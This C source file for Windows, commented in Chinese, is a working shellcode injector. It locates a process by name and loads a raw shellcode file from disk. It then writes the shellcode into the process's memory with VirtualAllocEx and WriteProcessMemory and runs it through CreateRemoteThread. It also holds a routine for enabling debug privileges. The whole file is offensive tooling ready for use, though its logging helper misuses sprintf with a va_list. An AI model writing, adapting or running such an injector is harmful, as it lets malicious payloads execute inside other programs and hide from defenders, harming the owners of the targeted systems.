#define _CRT_SECURE_NO_WARNINGS
#include<Windows.h>
#include<stdio.h>
#include<string.h>
#include <tlhelp32.h>
#define my_test 1
int flen;
void log(const char* format, ...)
{
    va_list vl;
    char szLog[512] = { 0, };

    va_start(vl, format);
    sprintf(szLog, format, vl);
    va_end(vl);

    OutputDebugStringA(szLog);
}
BOOL Get_Privilege(char* lpszPrivilege, DWORD bEnablePrivilege)
{
    TOKEN_PRIVILEGES tp;
    HANDLE hToken;
    LUID luid;

    if (!OpenProcessToken(
        GetCurrentProcess(),//获取当前进程的句柄
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, // 要修改权限+需要查询信息
        &hToken)//即函数调用成功后将获得的令牌句柄存储到这个变量中。
        )
    {
        log("OpenProcessToken error: %u\n", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValueA(//该函数用于检索给定特权名称的特权标识符
        NULL,//NULL表示将使用本地系统来执行特权查找操作
        lpszPrivilege, //字符串,指定要查找其特权标识符的特权名称。
        &luid//输出变量,这是一个指向LUID（特权标识符）变量的指针
    )
        )
    {
        log("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
    {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else
    {
        tp.Privileges[0].Attributes = 0;
    }

    if (!AdjustTokenPrivileges(
        hToken, //从OpenProcessToken获取的
        FALSE,
        &tp,//从LookupPrivilegeValue获取的
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL
    )
        )
    {

        log("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        log("The token does not have the specified privilege. \n");
        return FALSE;
    }

    return TRUE;
}
BOOL inject_shellcode(DWORD dwPID, char* lp_shellcode_data,int lp_shellcode_len)
{
    HANDLE hProcess = NULL, hThread = NULL;
    LPVOID pRemoteBuf = NULL;
    LPTHREAD_START_ROUTINE pThreadProc;
    if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))
    {
        log("OpenProcess(%d) failed!!! [%d]\n", dwPID, GetLastError());//这里为完全控制权限，即所有访问权限（读、写、执行等）
        return FALSE;
    }
    pRemoteBuf = VirtualAllocEx(hProcess, NULL, lp_shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pRemoteBuf)
    {
        WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)lp_shellcode_data, lp_shellcode_len, NULL);//往目标进程写入数据
        hThread = CreateRemoteThread(hProcess, NULL, 0, pRemoteBuf, 0, 0, NULL);//创建一个远程线程,指定了线程处理函数,线程参数(参数的地址是刚才在目标进程分配的)
        if (hThread)
        {
            WaitForSingleObject(hThread, INFINITE);//等待远程线程执行完毕
            CloseHandle(hThread);
        }
        VirtualFreeEx(hProcess, pRemoteBuf, lp_shellcode_len, MEM_FREE);
    }
    CloseHandle(hProcess);
    return TRUE;
}
DWORD FindProcessID(CHAR* szProcessName)//
{
    DWORD dwPID = 0xFFFFFFFF;
    HANDLE hSnapShot = INVALID_HANDLE_VALUE;
    PROCESSENTRY32 pe;

    // Get the snapshot of the system
    pe.dwSize = sizeof(PROCESSENTRY32);
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

    // find process
    Process32First(hSnapShot, &pe);
    do
    {
        if (!strcmp(szProcessName, pe.szExeFile))
        {
            dwPID = pe.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapShot, &pe));
    CloseHandle(hSnapShot);
    return dwPID;
}
BYTE* read2Mem(char* fpath)
{
    // 打开文件
    DWORD fileSize;
    LPVOID pMemory;
    DWORD bytesRead;

    HANDLE hFile = CreateFileA(fpath,  // 文件路径，根据实际情况进行修改
        GENERIC_READ,               // 访问模式，只读
        0,                          // 共享模式，不共享
        NULL,                       // 安全特性，使用默认值
        OPEN_EXISTING,              // 打开已存在的文件
        FILE_ATTRIBUTE_NORMAL,      // 文件属性，正常
        NULL                        // 模板文件句柄，不使用
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("无法打开文件\n");
        return NULL;
    }

    // 获取文件大小
    fileSize = GetFileSize(hFile, NULL);
    flen = fileSize;
    if (fileSize == INVALID_FILE_SIZE)
    {
        printf("无法获取文件大小\n");
        CloseHandle(hFile);
        return NULL;
    }

    // 分配内存
    pMemory = VirtualAlloc(
        NULL,                   // 指定分配的地址，在此使用 NULL 表示由系统选择
        fileSize,               // 分配的内存大小，与文件大小一致
        MEM_COMMIT,             // 内存分配类型，表示提交内存
        PAGE_READWRITE          // 内存页面属性，读写权限
    );
    if (pMemory == NULL)
    {
        printf("无法分配内存\n");
        CloseHandle(hFile);
        return NULL;
    }

    if (!ReadFile(
        hFile,                  // 文件句柄
        pMemory,                // 缓冲区地址，用于接收文件内容
        fileSize,               // 要读取的字节数，与文件大小一致
        &bytesRead,             // 实际读取的字节数
        NULL                    // 用于传递异步 I/O 句柄，不使用
    )) {
        printf("读取文件失败\n");
        VirtualFree(pMemory, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return NULL;
    }
    CloseHandle(hFile);
    //VirtualFree(pMemory, 0, MEM_RELEASE);
    return pMemory;
}
int main(int argc, char* argv[])
{
    char* shellcode_path;
    char* lp_shellcode;
    char* TargetProcess;
    DWORD dwPID;
    HANDLE hProcess;
    DWORD is_x86 = 0;

    if (argc != 3)//pid button dllPath
    {
        //那就是手动输入的
#ifdef my_test
        TargetProcess = "notepad_86.exe";
        shellcode_path = "D:/shellcode.bin";
        dwPID = FindProcessID(TargetProcess);
#else
        log("USAGE: TargetName shellcode_path \n");//说明该如何使用该工具
        return 1;
#endif
    }
    else {

        TargetProcess = argv[1];
        shellcode_path = argv[2];
        dwPID = FindProcessID(TargetProcess);
    }
    //if (!Get_Privilege(SE_DEBUG_NAME, TRUE))//提权
    //{
    //    return 1;
    //}
    if (dwPID == 0xFFFFFFFF) {
        log("no find TargetProcess\n");
        return 0;
    }
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPID);
    IsWow64Process(hProcess, &is_x86);
    CloseHandle(hProcess);


    if (!is_x86) {
        log("Target is X64!\n");
        return 0;
    }
    lp_shellcode=read2Mem(shellcode_path);
    if (inject_shellcode(dwPID, lp_shellcode,flen)) {
        log("(\"%s\") success!!!\n", argv[2]);
    }
    else {
        log("(\"%s\") failed!!!\n", argv[2]);
    }
    VirtualFree(lp_shellcode, 0, MEM_RELEASE);
    return 0;
}